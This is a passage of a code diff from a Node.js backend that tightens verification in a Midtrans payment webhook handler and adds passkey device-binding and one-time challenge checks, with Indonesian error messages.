+    transactionId: bindingTransactionId,
+    customerId: bindingCustomerId,
+    gatewayReference,
+    parentType: binding.parentType,
+    parentId: binding.parentId,
+    serviceType: binding.serviceType,
+    amount: grossAmount,
+    currency
+  }, binding.signature);
+  if (!bindingValid) {
+    return res.status(403).json({ ok: false, message: 'Signature binding webhook Midtrans tidak valid.' });
+  }
 
-  const txResult = await midtransFetchPaymentTransaction(gatewayReference);
+  const txResult = await midtransFetchPaymentTransaction({
+    transactionId: bindingTransactionId,
+    customerId: bindingCustomerId,
+    gatewayReference,
+    parentType: binding.parentType,
+    parentId: binding.parentId,
+    serviceType: binding.serviceType,
+    grossAmount,
+    currency
+  });
   if (!txResult.ok) {
     await diracCentralBanCurrentContextV146('midtrans_transaction_not_found').catch(() => null);
     return res.status(txResult.status || 404).json({ ok: false, message: txResult.message || 'Payment transaction tidak ditemukan.' });
   }
 
   const tx = txResult.transaction;
+  const existingEvent = await midtransFetchGatewayEvent(gatewayEventId, tx.customer_id);
+  const duplicateEvent = Boolean(existingEvent.ok && existingEvent.exists);
   const transactionAmount = midtransMoney(tx.amount);
   if (transactionAmount !== grossAmount) {
     await diracCentralBanCurrentContextV146('midtrans_amount_mismatch').catch(() => null);
-    await midtransInsertGatewayEventSafe(tx.id, gatewayEventId, 'failed', body, {
+    await midtransInsertGatewayEventSafe(tx.id, tx.customer_id, gatewayEventId, 'failed', body, {
       reason: 'amount_mismatch',
       expected_amount: transactionAmount,
       gross_amount: grossAmount
@@ -10637,7 +13135,7 @@ async function midtransHandleWebhook(req, res) {
   const ownerCheck = await midtransVerifyTransactionOwnerAndAmount(tx, grossAmount);
   if (!ownerCheck.ok) {
     await diracCentralBanCurrentContextV146(ownerCheck.reason || 'midtrans_owner_or_amount_mismatch').catch(() => null);
-    await midtransInsertGatewayEventSafe(tx.id, gatewayEventId, 'failed', body, {
+    await midtransInsertGatewayEventSafe(tx.id, tx.customer_id, gatewayEventId, 'failed', body, {
       reason: ownerCheck.reason || 'owner_or_amount_mismatch'
     });
     return res.status(ownerCheck.status || 409).json({ ok: false, message: ownerCheck.message || 'Payment tidak cocok dengan order/customer.' });
@@ -10646,7 +13144,7 @@ async function midtransHandleWebhook(req, res) {
   const eventStatus = success ? 'processed' : 'received';
   const eventInsert = duplicateEvent
     ? { ok: true, duplicate: true, skipped: 'gateway_event_already_exists' }
-    : await midtransInsertGatewayEventSafe(tx.id, gatewayEventId, eventStatus, body, {
+    : await midtransInsertGatewayEventSafe(tx.id, tx.customer_id, gatewayEventId, eventStatus, body, {
       mapped_payment_status: mappedStatus,
       success,
       gateway_reference: gatewayReference
@@ -10656,7 +13154,7 @@ async function midtransHandleWebhook(req, res) {
     return res.status(eventInsert.status || 500).json({ ok: false, message: 'Gagal menyimpan event webhook Midtrans.' });
   }
 
-  const txPatch = await midtransPatchPaymentTransaction(tx.id, mappedStatus, body, success);
+  const txPatch = await midtransPatchPaymentTransaction(tx, mappedStatus, body, success);
   if (!txPatch.ok) {
     return res.status(txPatch.status || 500).json({ ok: false, message: 'Gagal update payment transaction dari webhook Midtrans.' });
   }
@@ -10696,27 +13194,104 @@ async function midtransHandleWebhook(req, res) {
   });
 }
 
-async function midtransFetchPaymentTransaction(gatewayReference) {
-  const select = [
-    'id', 'customer_id', 'order_id', 'domain_order_id', 'service_type', 'gateway_name',
-    'gateway_reference', 'payment_status', 'amount', 'currency', 'payment_url', 'metadata'
-  ].join(',');
-  const path = '/rest/v1/payment_transactions?select=' + encodeURIComponent(select)
-    + '&gateway_reference=eq.' + encodeURIComponent(gatewayReference)
-    + '&limit=1';
+async function midtransFetchPaymentTransaction(input) {
+  const transactionId = String(input && input.transactionId || '').trim();
+  const customerId = String(input && input.customerId || '').trim();
+  const gatewayReference = midtransSafeText(input && input.gatewayReference || '', 120);
+  const parentType = String(input && input.parentType || '').trim().toLowerCase();
+  const parentId = String(input && input.parentId || '').trim().toLowerCase();
+  const serviceType = lockedPaymentNormalizeServiceType(input && input.serviceType || '');
+  const grossAmount = midtransMoney(input && input.grossAmount);
+  const currency = midtransSafeText(input && input.currency || 'IDR', 12).toUpperCase();
 
-  const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
-  if (!result.ok) return { ok: false, status: result.status, message: 'Gagal membaca payment transaction.' };
+  if (!customerSecurityLooksLikeUuid(transactionId)
+      || !customerSecurityLooksLikeUuid(customerId)
+      || !customerSecurityLooksLikeUuid(parentId)
+      || !/^[rd]$/.test(parentType)
+      || !/^[a-z0-9_]{1,64}$/.test(serviceType)
+      || !gatewayReference
+      || !gatewayReference.startsWith('PAY-')
+      || !/^[A-Za-z0-9._:@-]{3,120}$/.test(gatewayReference)
+      || !Number.isSafeInteger(grossAmount)
+      || grossAmount <= 0
+      || currency !== 'IDR') {
+    return { ok: false, status: 400, message: 'Binding payment transaction webhook tidak valid.' };
+  }
+
+  const select = [
+    'id',
+    'customer_id',
+    'order_id',
+    'domain_order_id',
+    'service_type',
+    'gateway_name',
+    'gateway_reference',
+    'payment_status',
+    'amount',
+    'currency',
+    'payment_url',
+    'metadata'
+  ].join(',');
+  const parentFilter = parentType === 'd'
+    ? '&domain_order_id=eq.' + encodeURIComponent(parentId) + '&order_id=is.null'
+    : '&order_id=eq.' + encodeURIComponent(parentId) + '&domain_order_id=is.null';
+  const path = '/rest/v1/payment_transactions?select=' + encodeURIComponent(select)
+    + '&id=eq.' + encodeURIComponent(transactionId)
+    + '&customer_id=eq.' + encodeURIComponent(customerId)
+    + '&service_type=eq.' + encodeURIComponent(serviceType)
+    + '&gateway_name=eq.midtrans'
+    + '&gateway_reference=eq.' + encodeURIComponent(gatewayReference)
+    + '&amount=eq.' + encodeURIComponent(String(grossAmount))
+    + '&currency=eq.' + encodeURIComponent(currency)
+    + parentFilter
+    + '&limit=2';
+
+  const result = await supabaseFetch(path, {
+    method: 'GET',
+    auth: 'service',
+    db: 'paymentService'
+  });
+
+  if (!result || result.ok !== true) {
+    return {
+      ok: false,
+      status: Number(result && result.status || 500),
+      message: 'Gagal memverifikasi binding payment transaction.'
+    };
+  }
+
   const rows = Array.isArray(result.data) ? result.data : [];
-  const row = rows[0] || null;
-  if (!row || !row.id) return { ok: false, status: 404, message: 'Payment transaction tidak ditemukan untuk gateway_reference ini.' };
+  const row = rows.length === 1 ? rows[0] : null;
+  const rowParentType = row && row.domain_order_id ? 'd' : 'r';
+  const rowParentId = String(row && (row.domain_order_id || row.order_id) || '').trim().toLowerCase();
+
+  if (!row
+      || !customerSecurityLooksLikeUuid(row.id)
+      || !customerSecurityLooksLikeUuid(row.customer_id)
+      || !customerSecurityLooksLikeUuid(rowParentId)
+      || Boolean(row.order_id) === Boolean(row.domain_order_id)
+      || String(row.id || '').trim() !== transactionId
+      || String(row.customer_id || '').trim() !== customerId
+      || rowParentType !== parentType
+      || rowParentId !== parentId
+      || lockedPaymentNormalizeServiceType(row.service_type || '') !== serviceType
+      || String(row.gateway_name || '').trim().toLowerCase() !== 'midtrans'
+      || String(row.gateway_reference || '').trim() !== gatewayReference
+      || midtransMoney(row.amount) !== grossAmount
+      || String(row.currency || '').trim().toUpperCase() !== currency) {
+    return { ok: false, status: 409, message: 'Binding payment transaction database tidak cocok.' };
+  }
+
   return { ok: true, transaction: row };
 }
 
 async function midtransVerifyTransactionOwnerAndAmount(tx, amount) {
   if (tx.order_id) {
     const select = 'id,customer_id,total,payment_status,order_status';
-    const result = await supabaseFetch('/rest/v1/orders?select=' + encodeURIComponent(select) + '&id=eq.' + encodeURIComponent(tx.order_id) + '&limit=1', {
+    const result = await supabaseFetch('/rest/v1/orders?select=' + encodeURIComponent(select)
+      + '&id=eq.' + encodeURIComponent(tx.order_id)
+      + '&customer_id=eq.' + encodeURIComponent(tx.customer_id)
+      + '&limit=1', {
       method: 'GET',
       auth: 'service'
     });
@@ -10730,7 +13305,10 @@ async function midtransVerifyTransactionOwnerAndAmount(tx, amount) {
 
   if (tx.domain_order_id) {
     const select = 'id,customer_id,total_price,payment_status,order_status,status';
-    const result = await supabaseFetch('/rest/v1/domain_orders?select=' + encodeURIComponent(select) + '&id=eq.' + encodeURIComponent(tx.domain_order_id) + '&limit=1', {
+    const result = await supabaseFetch('/rest/v1/domain_orders?select=' + encodeURIComponent(select)
+      + '&id=eq.' + encodeURIComponent(tx.domain_order_id)
+      + '&customer_id=eq.' + encodeURIComponent(tx.customer_id)
+      + '&limit=1', {
       method: 'GET',
       auth: 'service'
     });
@@ -10745,9 +13323,13 @@ async function midtransVerifyTransactionOwnerAndAmount(tx, amount) {
   return { ok: false, status: 409, message: 'Payment transaction tidak punya order_id/domain_order_id.', reason: 'missing_order_reference' };
 }
 
-async function midtransFetchGatewayEvent(gatewayEventId) {
-  const path = '/rest/v1/payment_gateway_events?select=' + encodeURIComponent('id,gateway_event_id')
+async function midtransFetchGatewayEvent(gatewayEventId, customerId) {
+  if (!gatewayEventId || !customerSecurityLooksLikeUuid(customerId)) {
+    return { ok: false, status: 409 };
+  }
+  const path = '/rest/v1/payment_gateway_events?select=' + encodeURIComponent('id,gateway_event_id,customer_id')
     + '&gateway_event_id=eq.' + encodeURIComponent(gatewayEventId)
+    + '&customer_id=eq.' + encodeURIComponent(customerId)
     + '&limit=1';
   const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
   if (!result.ok) return { ok: false, status: result.status };
@@ -10755,11 +13337,21 @@ async function midtransFetchGatewayEvent(gatewayEventId) {
   return { ok: true, exists: rows.length > 0, event: rows[0] || null };
 }
 
-async function midtransInsertGatewayEventSafe(paymentTransactionId, gatewayEventId, eventStatus, payload, metadata) {
+async function midtransInsertGatewayEventSafe(paymentTransactionId, customerId, gatewayEventId, eventStatus, payload, metadata) {
+  if (!customerSecurityLooksLikeUuid(paymentTransactionId) || !customerSecurityLooksLikeUuid(customerId)) {
+    return { ok: false, status: 409 };
+  }
   const basePayload = {
     payment_transaction_id: paymentTransactionId,
+    customer_id: customerId,
+    gateway_name: 'midtrans',
     gateway_event_id: gatewayEventId,
+    event_type: midtransSafeText(
+      payload && payload.transaction_status || 'notification',
+      80
+    ),
     event_status: eventStatus,
+    raw_payload: payload,
     payload,
     metadata: {
       provider: 'midtrans',
@@ -10780,12 +13372,14 @@ async function midtransInsertGatewayEventSafe(paymentTransactionId, gatewayEvent
     basePayload,
     {
       payment_transaction_id: paymentTransactionId,
+      customer_id: customerId,
       gateway_event_id: gatewayEventId,
       event_status: eventStatus,
       payload
     },
     {
       payment_transaction_id: paymentTransactionId,
+      customer_id: customerId,
       gateway_event_id: gatewayEventId,
       event_status: eventStatus
     }
@@ -10810,7 +13404,15 @@ async function midtransInsertGatewayEventSafe(paymentTransactionId, gatewayEvent
   return { ok: false, status: 500 };
 }
 
-async function midtransPatchPaymentTransaction(transactionId, status, payload, success) {
+async function midtransPatchPaymentTransaction(transaction, status, payload, success) {
+  const transactionId = String(transaction && transaction.id || '').trim();
+  const customerId = String(transaction && transaction.customer_id || '').trim();
+  const gatewayReference = String(transaction && transaction.gateway_reference || '').trim();
+  if (!customerSecurityLooksLikeUuid(transactionId)
+      || !customerSecurityLooksLikeUuid(customerId)
+      || !gatewayReference) {
+    return { ok: false, status: 409 };
+  }
   const metadata = {
     midtrans_last_notification_at: diracNowIso(),
     midtrans_transaction_id: payload.transaction_id || null,
@@ -10829,7 +13431,11 @@ async function midtransPatchPaymentTransaction(transactionId, status, payload, s
 
   if (success) body.paid_at = payload.settlement_time || diracNowIso();
 
-  const first = await supabaseFetch('/rest/v1/payment_transactions?id=eq.' + encodeURIComponent(transactionId), {
+  const transactionPath = '/rest/v1/payment_transactions?id=eq.' + encodeURIComponent(transactionId)
+    + '&customer_id=eq.' + encodeURIComponent(customerId)
+    + '&gateway_reference=eq.' + encodeURIComponent(gatewayReference);
+
+  const first = await supabaseFetch(transactionPath, {
     method: 'PATCH',
     auth: 'service',
     prefer: 'return=representation',
@@ -10838,7 +13444,7 @@ async function midtransPatchPaymentTransaction(transactionId, status, payload, s
 
   if (first.ok) return first;
 
-  const fallback = await supabaseFetch('/rest/v1/payment_transactions?id=eq.' + encodeURIComponent(transactionId), {
+  const fallback = await supabaseFetch(transactionPath, {
     method: 'PATCH',
     auth: 'service',
     prefer: 'return=representation',
@@ -10852,7 +13458,8 @@ async function midtransPatchRelatedOrderPaid(tx, payload) {
   const paidAt = payload.settlement_time || diracNowIso();
 
   if (tx.order_id) {
-    const path = '/rest/v1/orders?id=eq.' + encodeURIComponent(tx.order_id);
+    const path = '/rest/v1/orders?id=eq.' + encodeURIComponent(tx.order_id)
+      + '&customer_id=eq.' + encodeURIComponent(tx.customer_id);
     const first = await supabaseFetch(path, {
       method: 'PATCH',
       auth: 'service',
@@ -10883,7 +13490,8 @@ async function midtransPatchRelatedOrderPaid(tx, payload) {
   }
 
   if (tx.domain_order_id) {
-    const path = '/rest/v1/domain_orders?id=eq.' + encodeURIComponent(tx.domain_order_id);
+    const path = '/rest/v1/domain_orders?id=eq.' + encodeURIComponent(tx.domain_order_id)
+      + '&customer_id=eq.' + encodeURIComponent(tx.customer_id);
     const first = await supabaseFetch(path, {
       method: 'PATCH',
       auth: 'service',
@@ -10928,14 +13536,14 @@ async function midtransPatchRelatedOrderPaid(tx, payload) {
    - Wrapper tetap ada agar action lama tidak menyebabkan crash, tetapi selalu mengembalikan disabled.
    ============================================================ */
 
-const __diracIpaymuPaymentPreviousHandler = module.exports;
+const __diracIpaymuPaymentPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function ipaymuPaymentWrapper(req, res) {
+__diracV202RegisterMiddleware(async function ipaymuPaymentWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = ipaymuNormalizeAction(rawAction);
 
   if (action !== 'ipaymu_health' && action !== 'ipaymu_webhook') {
-    return __diracIpaymuPaymentPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -10949,7 +13557,7 @@ module.exports = async function ipaymuPaymentWrapper(req, res) {
     activeProvider: 'midtrans',
     message: 'iPaymu dinonaktifkan. Payment gateway aktif hanya Midtrans.'
   });
-};
+}, "ipaymuPaymentWrapper");
 
 function ipaymuNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -11075,7 +13683,7 @@ function diracA2FHardBanCurrentRequest(reason) {
    - Dashboard proof remains backend-only HttpOnly cookie.
    ============================================================ */
 
-const __diracPasskeyA2FPreviousHandler = module.exports;
+const __diracPasskeyA2FPreviousHandler = __diracV202DispatcherSentinel;
 const DIRAC_PASSKEY_A2F_ACTIONS = new Set([
   'dirac_mfa_passkey_start',
   'dirac_mfa_passkey_verify',
@@ -11089,10 +13697,10 @@ const DIRAC_PASSKEY_A2F_CONSUME_LOCKS = globalThis.__DIRAC_PASSKEY_A2F_CONSUME_L
 globalThis.__DIRAC_PASSKEY_A2F_CHALLENGE_STORE__ = DIRAC_PASSKEY_A2F_CHALLENGE_STORE;
 globalThis.__DIRAC_PASSKEY_A2F_CONSUME_LOCKS__ = DIRAC_PASSKEY_A2F_CONSUME_LOCKS;
 
-module.exports = async function diracPasskeyA2FWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracPasskeyA2FWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   if (!DIRAC_PASSKEY_A2F_ACTIONS.has(rawAction)) {
-    return __diracPasskeyA2FPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -11111,7 +13719,7 @@ module.exports = async function diracPasskeyA2FWrapper(req, res) {
       : String(error && error.message ? error.message : 'Passkey A2F belum bisa diproses.');
     return res.status(status).json({ ok: false, method: 'passkey', message: publicMessage });
   }
-};
+}, "diracPasskeyA2FWrapper");
 
 function diracPasskeyA2FB64UrlJson(data) {
   return Buffer.from(JSON.stringify(data)).toString('base64url');
@@ -11319,8 +13927,19 @@ function diracPasskeyA2FParseAuthData(authData, rpId, requireAttestedCredential)
   const flags = buf.readUInt8(32);
   if ((flags & 0x01) !== 0x01) return { ok: false, reason: 'user_presence_missing' };
   if ((flags & 0x04) !== 0x04) return { ok: false, reason: 'user_verification_missing' };
+  const backupEligible = (flags & 0x08) === 0x08;
+  const backupState = (flags & 0x10) === 0x10;
+  if (backupState && !backupEligible) return { ok: false, reason: 'passkey_backup_flags_invalid' };
   const signCount = buf.readUInt32BE(33);
-  const parsed = { ok: true, flags, signCount, authData: buf };
+  const parsed = {
+    ok: true,
+    flags,
+    signCount,
+    backupEligible,
+    backupState,
+    deviceBound: backupEligible === false && backupState === false,
+    authData: buf
+  };
   if (!requireAttestedCredential) return parsed;
   if ((flags & 0x40) !== 0x40) return { ok: false, reason: 'attested_credential_missing' };
   if (buf.length < 55) return { ok: false, reason: 'attested_credential_too_short' };
@@ -11379,6 +13998,146 @@ function diracPasskeyA2FStoredPublicKey(row) {
   return jwk && typeof jwk === 'object' ? jwk : null;
 }
 
+const DIRAC_PASSKEY_DEVICE_BINDING_VERSION = 'dirac-passkey-device-binding-v1';
+const DIRAC_PASSKEY_DEVICE_BINDING_ALGORITHM = 'ECDSA-P256-SHA256';
+
+function diracPasskeyA2FDeviceBindingKeyId(publicKeyJwk) {
+  const jwk = publicKeyJwk && typeof publicKeyJwk === 'object' ? publicKeyJwk : {};
+  const x = diracPasskeyA2FSafeString(jwk.x, 64);
+  const y = diracPasskeyA2FSafeString(jwk.y, 64);
+  if (jwk.kty !== 'EC' || jwk.crv !== 'P-256'
+      || !/^[A-Za-z0-9_-]{43}$/.test(x)
+      || !/^[A-Za-z0-9_-]{43}$/.test(y)) return '';
+  let xBytes;
+  let yBytes;
+  try {
+    xBytes = diracPasskeyA2FBase64UrlToBuffer(x);
+    yBytes = diracPasskeyA2FBase64UrlToBuffer(y);
+  } catch (_) {
+    return '';
+  }
+  if (xBytes.length !== 32 || yBytes.length !== 32
+      || xBytes.toString('base64url') !== x
+      || yBytes.toString('base64url') !== y) return '';
+  return crypto.createHash('sha256').update('P-256\n' + x + '\n' + y).digest('hex');
+}
+
+function diracPasskeyA2FDecodeDeviceBindingEnvelope(body, expectedMode) {
+  const raw = diracPasskeyA2FSafeString(body && body.response, 1024);
+  const mode = String(expectedMode || '').toLowerCase();
+  if (!raw || (mode !== 'registration' && mode !== 'authentication')) {
+    return { ok: false, reason: 'device_binding_envelope_missing' };
+  }
+  const parts = raw.split('.');
+  if (mode === 'registration') {
+    if (parts.length !== 5 || parts[0] !== 'dpk1r') return { ok: false, reason: 'device_binding_registration_envelope_invalid' };
+    const keyId = String(parts[1] || '');
+    const x = String(parts[2] || '');
+    const y = String(parts[3] || '');
+    const signatureText = String(parts[4] || '');
+    if (!/^[a-f0-9]{64}$/.test(keyId)
+        || !/^[A-Za-z0-9_-]{43}$/.test(x)
+        || !/^[A-Za-z0-9_-]{43}$/.test(y)
+        || !/^[A-Za-z0-9_-]{86}$/.test(signatureText)) {
+      return { ok: false, reason: 'device_binding_registration_envelope_invalid' };
+    }
+    const publicKeyJwk = { kty: 'EC', crv: 'P-256', x, y };
+    const computedKeyId = diracPasskeyA2FDeviceBindingKeyId(publicKeyJwk);
+    if (!computedKeyId || !safeEqual(computedKeyId, keyId)) {
+      return { ok: false, reason: 'device_binding_public_key_id_mismatch' };
+    }
+    let signature;
+    try { signature = diracPasskeyA2FBase64UrlToBuffer(signatureText); } catch (_) { signature = Buffer.alloc(0); }
+    if (signature.length !== 64 || signature.toString('base64url') !== signatureText) return { ok: false, reason: 'device_binding_signature_format_invalid' };
+    return { ok: true, mode, keyId, publicKeyJwk, signature };
+  }
+  if (parts.length !== 3 || parts[0] !== 'dpk1a') return { ok: false, reason: 'device_binding_authentication_envelope_invalid' };
+  const keyId = String(parts[1] || '');
+  const signatureText = String(parts[2] || '');
+  if (!/^[a-f0-9]{64}$/.test(keyId) || !/^[A-Za-z0-9_-]{86}$/.test(signatureText)) {
+    return { ok: false, reason: 'device_binding_authentication_envelope_invalid' };
+  }
+  let signature;
+  try { signature = diracPasskeyA2FBase64UrlToBuffer(signatureText); } catch (_) { signature = Buffer.alloc(0); }
+  if (signature.length !== 64 || signature.toString('base64url') !== signatureText) return { ok: false, reason: 'device_binding_signature_format_invalid' };
+  return { ok: true, mode, keyId, signature };
+}
+
+function diracPasskeyA2FDeviceBindingSigningInput({ setupToken, payload, credentialId, mode }) {
+  const tokenHash = crypto.createHash('sha256').update(String(setupToken || '')).digest('base64url');
+  return [
+    'DIRAC_PASSKEY_DEVICE_BINDING_V1',
+    String(mode || '').toLowerCase(),
+    String(payload && payload.challenge || ''),
+    String(credentialId || ''),
+    tokenHash
+  ].join('\n');
+}
+
+function diracPasskeyA2FVerifyDeviceBindingSignature(publicKeyJwk, signature, signingInput) {
+  const keyId = diracPasskeyA2FDeviceBindingKeyId(publicKeyJwk);
+  if (!keyId || !Buffer.isBuffer(signature) || signature.length !== 64 || !signingInput) return false;
+  try {
+    const publicKey = crypto.createPublicKey({ key: publicKeyJwk, format: 'jwk' });
+    const data = Buffer.from(String(signingInput), 'utf8');
+    return crypto.verify('sha256', data, { key: publicKey, dsaEncoding: 'ieee-p1363' }, signature);
+  } catch (_) {
+    return false;
+  }
+}
+
+function diracPasskeyA2FStoredDeviceBinding(row) {
+  const json = row && row.credential_json && typeof row.credential_json === 'object' ? row.credential_json : {};
+  const binding = json && json.device_binding && typeof json.device_binding === 'object' ? json.device_binding : null;
+  if (!binding || binding.required !== true
+      || binding.version !== DIRAC_PASSKEY_DEVICE_BINDING_VERSION
+      || binding.algorithm !== DIRAC_PASSKEY_DEVICE_BINDING_ALGORITHM
+      || !/^[a-f0-9]{64}$/.test(String(binding.key_id || ''))) {
+    return { ok: false, reason: 'stored_device_binding_missing' };
+  }
+  const publicKeyJwk = binding.public_key_jwk && typeof binding.public_key_jwk === 'object'
+    ? binding.public_key_jwk
+    : null;
+  const computedKeyId = diracPasskeyA2FDeviceBindingKeyId(publicKeyJwk);
+  if (!computedKeyId || !safeEqual(computedKeyId, String(binding.key_id))) {
+    return { ok: false, reason: 'stored_device_binding_key_invalid' };
+  }
+  return { ok: true, keyId: computedKeyId, publicKeyJwk, binding };
+}
+
+function diracPasskeyA2FValidateRegistrationDeviceBinding({ body, setupToken, payload, credentialId }) {
+  const envelope = diracPasskeyA2FDecodeDeviceBindingEnvelope(body, 'registration');
+  if (!envelope.ok) return envelope;
+  const signingInput = diracPasskeyA2FDeviceBindingSigningInput({
+    setupToken,
+    payload,
+    credentialId,
+    mode: 'registration'
+  });
+  if (!diracPasskeyA2FVerifyDeviceBindingSignature(envelope.publicKeyJwk, envelope.signature, signingInput)) {
+    return { ok: false, reason: 'device_binding_registration_signature_invalid' };
+  }
+  return { ok: true, keyId: envelope.keyId, publicKeyJwk: envelope.publicKeyJwk };
+}
+
+function diracPasskeyA2FValidateAuthenticationDeviceBinding({ row, body, setupToken, payload, credentialId }) {
+  const stored = diracPasskeyA2FStoredDeviceBinding(row);
+  if (!stored.ok) return stored;
+  const envelope = diracPasskeyA2FDecodeDeviceBindingEnvelope(body, 'authentication');
+  if (!envelope.ok) return envelope;
+  if (!safeEqual(stored.keyId, envelope.keyId)) return { ok: false, reason: 'device_binding_key_mismatch' };
+  const signingInput = diracPasskeyA2FDeviceBindingSigningInput({
+    setupToken,
+    payload,
+    credentialId,
+    mode: 'authentication'
+  });
+  if (!diracPasskeyA2FVerifyDeviceBindingSignature(stored.publicKeyJwk, envelope.signature, signingInput)) {
+    return { ok: false, reason: 'device_binding_authentication_signature_invalid' };
+  }
+  return { ok: true, keyId: stored.keyId, publicKeyJwk: stored.publicKeyJwk, binding: stored.binding };
+}
+
 function diracPasskeyA2FValidateAuthenticationResponse({ row, response, payload, clientData, req }) {
   const authData = diracPasskeyA2FBase64UrlToBuffer(response && response.authenticatorData);
   const signature = diracPasskeyA2FBase64UrlToBuffer(response && response.signature);
@@ -11389,6 +14148,15 @@ function diracPasskeyA2FValidateAuthenticationResponse({ row, response, payload,
   try { parsed = diracPasskeyA2FParseAuthData(authData, rpId, false); } catch (_) { return { ok: false, reason: 'authenticator_data_invalid' }; }
   if (!parsed.ok) return parsed;
   if (String(clientData && clientData.type || '') !== 'webauthn.get') return { ok: false, reason: 'client_data_type_invalid' };
+  const storedWebauthn = row && row.credential_json && row.credential_json.webauthn && typeof row.credential_json.webauthn === 'object'
+    ? row.credential_json.webauthn
+    : {};
+  if (typeof storedWebauthn.backup_eligible !== 'boolean') {
+    return { ok: false, reason: 'stored_passkey_backup_policy_missing' };
+  }
+  if (storedWebauthn.backup_eligible !== parsed.backupEligible) {
+    return { ok: false, reason: 'passkey_backup_eligibility_changed' };
+  }
   const jwk = diracPasskeyA2FStoredPublicKey(row);
   if (!jwk) return { ok: false, reason: 'stored_public_key_missing' };
   try {
@@ -11401,7 +14169,13 @@ function diracPasskeyA2FValidateAuthenticationResponse({ row, response, payload,
   }
   const previousCount = Math.max(0, Number(row && row.sign_count || 0));
   if (previousCount > 0 && parsed.signCount > 0 && parsed.signCount <= previousCount) {
-    return { ok: false, reason: 'passkey_sign_count_replay' };
+    return {
+      ...parsed,
+      ok: false,
+      reason: 'passkey_sign_count_replay',
+      previousSignCount: previousCount,
+      newSignCount: parsed.signCount
+    };
   }
   return { ok: true, ...parsed };
 }
@@ -11411,11 +14185,16 @@ async function diracPasskeyA2FStoreChallenge(setupToken, payload) {
   if (!jti) return false;
   const record = { token_hash: customerMfaBindingHash('passkey_token', setupToken), expiresAtMs: Number(payload.expiresAtMs || 0), used: false };
   DIRAC_PASSKEY_A2F_CHALLENGE_STORE.set(jti, record);
-  try {
-    if (typeof writePersistentSecurityJson === 'function') {
-      await writePersistentSecurityJson('passkey-a2f-jti:' + jti, record, 0, Math.max(60, Math.ceil((record.expiresAtMs - Date.now()) / 1000) + 30)).catch(() => false);
-    }
-  } catch (_) {}
+  const ttl = Math.max(60, Math.ceil((record.expiresAtMs - Date.now()) / 1000) + 30);
+  const stored = typeof writePersistentSecurityJsonRequiredV194 === 'function'
+    ? await writePersistentSecurityJsonRequiredV194('passkey-a2f-jti:' + jti, record, 0, ttl)
+    : false;
+  if (process.env.NODE_ENV === 'production' && !stored) {
+    DIRAC_PASSKEY_A2F_CHALLENGE_STORE.delete(jti);
+    const error = new Error('PASSKEY_CHALLENGE_PERSISTENCE_REQUIRED');
+    error.code = 'PASSKEY_CHALLENGE_PERSISTENCE_REQUIRED';
+    throw error;
+  }
   return true;
 }
 
@@ -11427,18 +14206,29 @@ async function diracPasskeyA2FConsumeChallenge(setupToken, payload) {
   DIRAC_PASSKEY_A2F_CONSUME_LOCKS.add(jti);
   let record = DIRAC_PASSKEY_A2F_CHALLENGE_STORE.get(jti) || null;
   try {
-    if (!record && typeof readPersistentSecurityJson === 'function') {
+    if (typeof readPersistentSecurityJsonStrictV194 === 'function' && LOGIN_SECURITY_PERSIST_TABLE) {
+      const lookup = await readPersistentSecurityJsonStrictV194('passkey-a2f-jti:' + jti);
+      if (!lookup.ok) return { ok: false, reason: 'passkey_challenge_storage_unavailable' };
+      if (lookup.found) record = lookup.record;
+      else if (process.env.NODE_ENV === 'production') return { ok: false, reason: 'passkey_challenge_missing_or_used' };
+    } else if (!record && typeof readPersistentSecurityJson === 'function') {
       record = await readPersistentSecurityJson('passkey-a2f-jti:' + jti).catch(() => null);
     }
     if (!record || record.used === true) return { ok: false, reason: 'passkey_challenge_missing_or_used' };
     if (Number(record.expiresAtMs || 0) <= now) return { ok: false, reason: 'passkey_challenge_expired' };
     if (!expectedHash || !record.token_hash || !safeEqual(String(record.token_hash), expectedHash)) return { ok: false, reason: 'passkey_challenge_token_mismatch' };
+    if (LOGIN_SECURITY_PERSIST_TABLE && typeof claimPersistentSecurityKeyOnceV194 === 'function') {
+      const claimed = await claimPersistentSecurityKeyOnceV194('passkey-a2f-used:' + jti, {
+        type: 'passkey_a2f_one_time_claim_v194',
+        token_hash: expectedHash,
+        usedAtMs: now
+      }, 120);
+      if (!claimed) return { ok: false, reason: 'passkey_challenge_replay_or_storage_failure' };
+    } else if (process.env.NODE_ENV === 'production') {
+      return { ok: false, reason: 'passkey_challenge_storage_unavailable' };
+    }
     DIRAC_PASSKEY_A2F_CHALLENGE_STORE.set(jti, { ...record, used: true, expiresAtMs: now + 1000 });
-    try {
-      if (typeof writePersistentSecurityJson === 'function') {
-        await writePersistentSecurityJson('passkey-a2f-jti:' + jti, { ...record, used: true, usedAtMs: now }, 0, 60).catch(() => false);
-      }
-    } catch (_) {}
+    await writePersistentSecurityJsonRequiredV194('passkey-a2f-jti:' + jti, { ...record, used: true, usedAtMs: now }, 0, 60).catch(() => false);
     return { ok: true };
   } finally {
     setTimeout(() => {
@@ -11481,6 +14271,24 @@ function diracPasskeyA2FMinimalCredentialJson({ credential, response, clientData
     saved_at: nowIso,
     user_agent_hash: customerMfaBindingHash('ua', requestUserAgent(req)) || null
   };
+}
+
+function diracPasskeyA2FCurrentAuthSessionIdV235(req, owner) {
+  const ownerUserId = String(owner && owner.authUserId || '').trim();
+  const ownerEmail = normalizeAuthEmail(owner && owner.email || '');
+  if (!customerSecurityLooksLikeUuid(ownerUserId) || !isValidAuthEmail(ownerEmail)) return '';
+
+  const cookies = parseCookies(req);
+  const matches = readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE)
+    .slice(0, 8)
+    .map(customerSecurityDecodeSignedSessionPayloadV228)
+    .filter((item) => item
+      && item.userId === ownerUserId
+      && item.email === ownerEmail
+      && customerSecurityLooksLikeUuid(item.sessionId))
+    .map((item) => String(item.sessionId));
+  const unique = Array.from(new Set(matches));
